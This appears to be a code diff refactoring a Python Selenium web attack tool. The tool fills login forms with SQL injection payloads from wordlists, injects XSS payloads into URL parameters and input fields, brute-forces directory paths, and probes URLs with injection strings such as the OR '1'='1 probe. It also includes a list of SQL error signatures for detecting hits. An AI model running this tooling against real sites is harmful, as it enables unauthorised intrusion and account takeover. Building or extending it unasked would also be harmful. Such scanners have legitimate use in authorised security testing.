@@ -7,15 +7,30 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.common.keys import Keys
 from selenium.common.exceptions import UnexpectedAlertPresentException, NoAlertPresentException
-from bs4 import BeautifulSoup
 from modules.mods import *
 import requests
 import string 
 import random
 import json
+from pathlib import Path
+from urllib.parse import urljoin
 from colorama import *
 
 box_width = 49
+BASE_DIR = Path(__file__).resolve().parent.parent
+
+SQL_ERROR_PATTERNS = [
+    "sql syntax",
+    "mysql",
+    "unclosed quotation mark",
+    "odbc sql server",
+    "sqlstate",
+    "postgresql",
+    "sqlite error",
+    "oracle error",
+    "warning: pg_",
+    "syntax error at or near"
+]
 
 # Function to create a fixed-width line bc it line wraps sometimes
 def create_box_line(content, width, align="left"):
@@ -33,71 +48,57 @@ def generate_random_string(length=8):
     random_string = ''.join(random.choice(characters) for _ in range(length))
     return random_string
 
+
+def _read_lines(path):
+    try:
+        with open(path, 'r') as f:
+            return [line.strip() for line in f.readlines() if line.strip()]
+    except FileNotFoundError:
+        print(f"Missing file: {path}")
+        return []
+
+
+def _dedupe_elements(elements):
+    unique = []
+    seen = set()
+    for element in elements:
+        key = element.id
+        if key not in seen:
+            unique.append(element)
+            seen.add(key)
+    return unique
+
+
+def _find_elements(driver, selectors):
+    found = []
+    for selector in selectors:
+        try:
+            if selector.startswith('//'):
+                found.extend(driver.find_elements(By.XPATH, selector))
+            else:
+                found.extend(driver.find_elements(By.NAME, selector))
+                found.extend(driver.find_elements(By.ID, selector))
+                found.extend(driver.find_elements(By.CSS_SELECTOR, f"[placeholder='{selector}']"))
+        except Exception as e:
+            print(f"Error finding selector {selector}: {e}")
+    return _dedupe_elements(found)
+
 def inject(url, driver, response, wordlist, payload, delay):
+    result = {
+        "queued": 0,
+        "tested": 0,
+        "working_payload": "",
+        "redirected_to": "",
+        "sql_error_detected": False
+    }
 
-    # Initialize lists to store the actual WebElement objects
-    email_elements = []
-    password_elements = []
-    # injection queue
-    num = 0
-    # Get the URL from the webdriver
     driver.get(url)
-    
-    
 
-    try:
-        # # Find elements by ID and NAME for password inputs
-         # Open the file and read each line into a list
-        with open("data/PassSelectors.txt", 'r') as f:
-            selectors = [line.strip() for line in f.readlines()]
+    password_selectors = _read_lines(BASE_DIR / "data" / "PassSelectors.txt")
+    email_selectors = _read_lines(BASE_DIR / "data" / "EmailSelectors.txt")
 
-        # Loop through selectors and attempt to find elements
-        # selector list is in data/PassSelectors.txt
-        for selector in selectors:
-            try:
-                # Check if it's an XPATH expression
-                if selector.startswith('//*[@'):
-                    elements = driver.find_elements(By.XPATH, selector)
-                else:
-                    elements = driver.find_elements(By.NAME, selector)
-                    elements = driver.find_elements(By.ID, selector)
-
-                if elements:
-                    password_elements.extend(elements)
-                
-            except Exception as e:
-                print(f"Error finding elements for selector {selector}: {e}")
-            # Remove duplicates by converting to a set and then back to a list
-        password_elements = list(set(password_elements))
-
-    except Exception as e:
-            print(f"An error occurred: {e}")
-
-    try:
-        # same as code above but for emails ^
-        with open("data/EmailSelectors.txt", 'r') as f:
-                Eselectors = [line.strip() for line in f.readlines()]
-
-        # Loop through selectors and attempt to find elements
-        # selector list is in data/PassSelectors.txt
-        for selector in Eselectors:
-            try:
-                # Check if it's an XPATH expression
-                if selector.startswith('//*[@'):
-                    elements = driver.find_elements(By.XPATH, selector)
-                else:
-                    elements = driver.find_elements(By.NAME, selector)
-                    elements = driver.find_elements(By.ID, selector)
-
-                if elements:
-                    email_elements.extend(elements)
-                
-            except Exception as e:
-                print(f"Error finding elements for selector {selector}: {e}")
-            # Remove duplicates by converting to a set and then back to a list
-        email_elements = list(set(email_elements))
-    except Exception as e:
-        print(f"An error occurred: {e}")
+    password_elements = _find_elements(driver, password_selectors)
+    email_elements = _find_elements(driver, email_selectors)
 
     # Count the elements
     pwd = len(password_elements)
@@ -106,31 +107,39 @@ def inject(url, driver, response, wordlist, payload, delay):
 
     # Call the logo function
     logo(url, response, count, pwd)
+    if not email_elements or not password_elements:
+        print("⟪ Could not find enough form elements to run SQL injection mode. ⟫")
+        return result
+
     # reading and deciding the payloads
     if payload == 1 or payload == 0:
-      if payload == 0:
-            print(f"⟪ {Fore.RED + "Using Defualt Wordlist" + Fore.RESET}                        ⟫")
+        if payload == 0:
+            print(f"⟪ {Fore.RED + 'Using Default Wordlist' + Fore.RESET}                        ⟫")
             print("⟪                                               ⟫")
-      with open('dict/sql-common.txt', 'r') as file:
-    # Read all lines and add them to a list
-          lines = file.readlines()
+        lines = _read_lines(BASE_DIR / 'dict' / 'sql-common.txt')
 
     if payload == 2:
-      with open('dict/sql-generic.txt', 'r') as f:
-          lines = f.readlines()
+        lines = _read_lines(BASE_DIR / 'dict' / 'sql-generic.txt')
 
     if payload == 3:
-      with open('dict/sql-time.txt', 'r') as f:
-          lines = f.readlines()
-    
+        lines = _read_lines(BASE_DIR / 'dict' / 'sql-time.txt')
 
+    if wordlist:
+        custom_lines = _read_lines(wordlist)
+        if custom_lines:
+            lines = custom_lines
 
-    email_credentials = [line.strip() for line in lines]
+    if not lines:
+        print("⟪ No payloads available. Check your wordlist files. ⟫")
+        return result
+
+    email_credentials = [line.strip() for line in lines if line.strip()]
 
     # email_credentials = ["admin' OR '1'='1'--", "user@example.com"]
     password_credentials = ["parrot"]
-    
+
     lenemail = len(email_credentials)
+    result["queued"] = lenemail
     if lenemail <= 2:
         print(f"⟪ Injections Loaded: {Fore.RED + str(lenemail) + Fore.RESET}                         ⟫")
     if lenemail >= 20 and lenemail <= 39:
@@ -141,17 +150,17 @@ def inject(url, driver, response, wordlist, payload, delay):
     print("⟪                                               ⟫")
     print("⟪ Injection Queue:                              ⟫")
     print("⟪                                               ⟫")
+    last_payload = ""
+
     for email in email_credentials:
         for password in password_credentials:
             try:
-                # Send keys to the email elements
-                
                 for element in email_elements:
                     element.clear()
                     element.send_keys(email)
-                    
-                    print(create_box_line(f"  {num}.  {email}", box_width, "left"))
-                    num += 1
+                print(create_box_line(f"  {result['tested']}.  {email}", box_width, "left"))
+                result["tested"] += 1
+                last_payload = email
                 
 
                 # Send keys to the password elements
@@ -162,6 +171,11 @@ def inject(url, driver, response, wordlist, payload, delay):
                 
                 # Press Enter after filling out the forms
                 password_elements[0].send_keys(Keys.RETURN)
+                time.sleep(max(delay, 0))
+
+                source = driver.page_source.lower()
+                if any(pattern in source for pattern in SQL_ERROR_PATTERNS):
+                    result["sql_error_detected"] = True
 
             except Exception as e:
                 pass
@@ -169,7 +183,7 @@ def inject(url, driver, response, wordlist, payload, delay):
                 print("⟪                                               ⟫")
                 print("⟪ Stopping...                                   ⟫")
                 print("⟪                                               ⟫")
-                print(create_box_line(f"Last Injection: {Fore.RED + email_credentials[num - 1] + Fore.RESET}", 59, "left"))
+                print(create_box_line(f"Last Injection: {Fore.RED + last_payload + Fore.RESET}", 59, "left"))
                 print("⟪                                               ⟫")
                 print("⟪±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±±⟫")
                 exit(1)
@@ -183,20 +197,21 @@ def inject(url, driver, response, wordlist, payload, delay):
         print("⟪                                               ⟫")
         print("⟪===============================================⟫ ")
         print("⟪                                               ⟫")
-        print(create_box_line(f"Working Injection: {Fore.YELLOW + email_credentials[num - 1] + Fore.RESET}", 59, "left"))
+        print(create_box_line(f"Working Injection: {Fore.YELLOW + last_payload + Fore.RESET}", 59, "left"))
         print(f"⟪                                               ⟫")
         print(f"⟪ Redirection:                                  ⟫")
         print("⟪                                               ⟫")
         print(f"⟪ {current_url}           ⟫")
+        result["working_payload"] = last_payload
+        result["redirected_to"] = current_url
         if current_url != "": 
             print("⟪                                               ⟫")
             print(create_box_line(f"Injection: {Fore.GREEN + 'Successful' + Fore.RESET}", 59, "left"))
-            save_to_json(url, num)
+            save_to_json(url, result["tested"])
             print("⟪                                               ⟫")
         else:
             print(create_box_line(f"Injection: {Fore.RED + 'Failure :(' + Fore.RESET}", 49, "left"))           
-    # Keep the browser open for 10 seconds before closing
-    time.sleep(10)
+    return result
     
 
 def brute(url,driver,response):
@@ -217,15 +232,15 @@ def subdomain(url, driver, wordlist):
     
     print("Home Page Source Captured.")
     
-    with open(wordlist, 'r') as f:
-        lines = f.readlines()
+    lines = _read_lines(wordlist)
+    found = []
         
     for line in lines:
         line = line.strip()  # Strip whitespace from each line
         if not line:  # Skip empty lines
             continue
             
-        newurl = url + "/" + line
+        newurl = urljoin(url.rstrip('/') + '/', line)
         
         try:
             driver.get(newurl)
@@ -235,9 +250,11 @@ def subdomain(url, driver, wordlist):
                 pass
             else:
                 print(create_box_line(f"{newurl}", 49, "left"))
+                found.append(newurl)
                 
         except Exception as e:
             print(f"Error accessing {newurl}: {e}")
+    return found
 
 # Function to handle alerts and continue
 def handle_alert(driver):
@@ -254,109 +271,130 @@ def handle_alert(driver):
         # No alert to handle
         pass
 
-def xssScan(driver, url,mode=1):
+def xssScan(driver, url, mode=1):
+    result = {
+        "mode": mode,
+        "tested": 0,
+        "reflected": 0,
+        "alerts": 0
+    }
 
-  if mode == 1:
-     input_elements = []
-     print("⟪===============================================⟫")
-     print("⟪                                               ⟫")
-     print("⟪ Scanning For XSS In URL:                      ⟫")
-     print("⟪                                               ⟫")
-     
-     with open('dict/xss-common.txt', 'r') as f:
-           xss_payloads = f.readlines()
-     
-     param_name = "q"
-     for payload in xss_payloads:
-         # Construct the vulnerable URL by injecting payload into the parameter
-         vulnerable_url = f"{url}{param_name}={payload}"
-         
-         
-         # Open the URL in the browser
-         print(create_box_line(f"{param_name}={payload.strip('\n')}", 49, "left"))
-         try:
-             driver.get(vulnerable_url)
-             time.sleep(2)  # Wait for the page to load
-             
-             # Handle any unexpected alerts
-             handle_alert(driver)
-             
-             # Check if the payload is reflected in the page source
-             page_source = driver.page_source
-             if payload in page_source:
-                 print(00)
-             else:
-                 pass
-         
-         except UnexpectedAlertPresentException:
-             # Handle the alert if it interrupts the execution
-           handle_alert(driver)
-    
-  if mode == 2:
-        
-    driver.get(url)
-    time.sleep(2)  # Wait for page to load
-    with open('dict/xss-common.txt', 'r') as f:
-        xss_payloads = f.readlines()
+    xss_payloads = _read_lines(BASE_DIR / 'dict' / 'xss-common.txt')
+    if not xss_payloads:
+        print("⟪ No XSS payloads loaded. ⟫")
+        return result
 
-    # Find all input fields on the page
-    inputs = driver.find_elements(By.TAG_NAME, 'input')
-    inputCount = len(inputs)
-    workingCount = []
-    
-    print("⟪                                               ⟫")
-    print("⟪===============================================⟫")
-    print("⟪                                               ⟫")
-    print(f"⟪ Input Fields: {inputCount}                               ⟫")
-    print("⟪                                               ⟫")
-    # color based on payload count
-    if len(xss_payloads) <= 8:
-        print(f"⟪ Payloads Loaded: {Fore.RED + str(len(xss_payloads)) + Fore.RESET}                            ⟫")
-    if len(xss_payloads) >= 8 and len(xss_payloads) <= 16:
-        print(f"⟪ Payloads Loaded: {Fore.YELLOW + str(len(xss_payloads)) + Fore.RESET}                            ⟫")
-    if len(xss_payloads) >= 17:
-        print(f"⟪ Payloads Loaded: {Fore.GREEN + str(len(xss_payloads)) + Fore.RESET}                          ⟫")
-        
-    print("⟪                                               ⟫")
-    print("⟪===============================================⟫")
-    print("⟪                                               ⟫")
-    print("⟪ Payload Queue:                                ⟫")
-    print("⟪                                               ⟫")
+    if mode == 1:
+        print("⟪===============================================⟫")
+        print("⟪                                               ⟫")
+        print("⟪ Scanning For XSS In URL:                      ⟫")
+        print("⟪                                               ⟫")
 
-    # Inject payloads into all input fields
-    for payload in xss_payloads:
-        for input_field in inputs:
+        param_name = "q"
+        for payload in xss_payloads:
+            vulnerable_url = f"{url}{param_name}={payload}"
+            print(create_box_line(f"{param_name}={payload}", 49, "left"))
             try:
-                input_field.clear()  # Clear the field
-                input_field.send_keys(payload)  # Inject XSS payload
-                input_field.send_keys(Keys.RETURN)  # Submit the form or move to the next
-                
-                time.sleep(2)  # Allow page to reload if necessary
-                
-                # Check if the payload appears in the HTML
+                driver.get(vulnerable_url)
+                time.sleep(2)
+                result["tested"] += 1
+
+                handle_alert(driver)
+
                 page_source = driver.page_source
                 if payload in page_source:
-                    # True
-                    print(create_box_line(f" {payload.strip('\n')}", 49, "left"))
-                    workingCount.extend(payload)
-                    
-                else:
-                    # False
-                    print(create_box_line(f" {payload.strip('\n')}", 49, "left"))
-                
-            except Exception as e:
-                # Check if an alert is present
+                    result["reflected"] += 1
+                    print(create_box_line(f"Reflected: {payload}", 49, "left"))
+            except UnexpectedAlertPresentException:
+                result["alerts"] += 1
+                handle_alert(driver)
+
+        return result
+
+    if mode == 2:
+        driver.get(url)
+        time.sleep(2)
+
+        inputs = driver.find_elements(By.TAG_NAME, 'input')
+        input_count = len(inputs)
+        working_count = []
+
+        print("⟪                                               ⟫")
+        print("⟪===============================================⟫")
+        print("⟪                                               ⟫")
+        print(f"⟪ Input Fields: {input_count}                               ⟫")
+        print("⟪                                               ⟫")
+        if len(xss_payloads) <= 8:
+            print(f"⟪ Payloads Loaded: {Fore.RED + str(len(xss_payloads)) + Fore.RESET}                            ⟫")
+        if len(xss_payloads) >= 8 and len(xss_payloads) <= 16:
+            print(f"⟪ Payloads Loaded: {Fore.YELLOW + str(len(xss_payloads)) + Fore.RESET}                            ⟫")
+        if len(xss_payloads) >= 17:
+            print(f"⟪ Payloads Loaded: {Fore.GREEN + str(len(xss_payloads)) + Fore.RESET}                          ⟫")
+
+        print("⟪                                               ⟫")
+        print("⟪===============================================⟫")
+        print("⟪                                               ⟫")
+        print("⟪ Payload Queue:                                ⟫")
+        print("⟪                                               ⟫")
+
+        for payload in xss_payloads:
+            for input_field in inputs:
                 try:
-                    alert = driver.switch_to.alert
-                    print("⟪                                               ⟫")
-                    print(create_box_line(f" {payload.strip('\n')}", 49, "left"))
-                    alert.accept()  # Dismiss the alert
-                    
-                except:
-                    print("⟪                                               ⟫")
-                    print("⟪===============================================⟫")
-                    print("⟪                                               ⟫")
-                    print(f"⟪ {Fore.RED + 'Error!' + Fore.RESET} Can't Interact With Element!           ⟫")
-                    return 1
-            
-    print(f"Working Payloads: {len(workingCount)}")        
+                    input_field.clear()
+                    input_field.send_keys(payload)
+                    input_field.send_keys(Keys.RETURN)
+                    time.sleep(2)
+
+                    page_source = driver.page_source
+                    print(create_box_line(f" {payload}", 49, "left"))
+                    result["tested"] += 1
+                    if payload in page_source:
+                        working_count.append(payload)
+                        result["reflected"] += 1
+                except Exception:
+                    try:
+                        alert = driver.switch_to.alert
+                        print("⟪                                               ⟫")
+                        print(create_box_line(f" {payload}", 49, "left"))
+                        alert.accept()
+                        result["alerts"] += 1
+                    except Exception:
+                        print("⟪                                               ⟫")
+                        print("⟪===============================================⟫")
+                        print("⟪                                               ⟫")
+                        print(f"⟪ {Fore.RED + 'Error!' + Fore.RESET} Can't Interact With Element!           ⟫")
+                        return result
+
+        print(f"Working Payloads: {len(working_count)}")
+        return result
+
+    print("⟪ Unknown XSS mode selected. Use 1 or 2. ⟫")
+    return result
+
+
+def detect_sql_errors(url, headers):
+    probes = ["'", '"', "')", "--", "' OR '1'='1"]
+    findings = []
+
+    for probe in probes:
+        test_url = f"{url}?id={probe}"
+        try:
+            response = requests.get(test_url, headers=headers, timeout=15)
+            body = response.text.lower()
+            matched = [p for p in SQL_ERROR_PATTERNS if p in body]
+            if matched:
+                findings.append({
+                    "probe": probe,
+                    "status": response.status_code,
+                    "matched_patterns": matched,
+                    "url": test_url
+                })
+                print(create_box_line(f"SQL pattern hit with probe: {probe}", 49, "left"))
+        except requests.RequestException as e:
+            print(f"Request failed for probe {probe}: {e}")
+
+    print(create_box_line(f"SQL detection findings: {len(findings)}", 49, "left"))
+    return {
+        "findings": findings,
+        "count": len(findings)
+    }
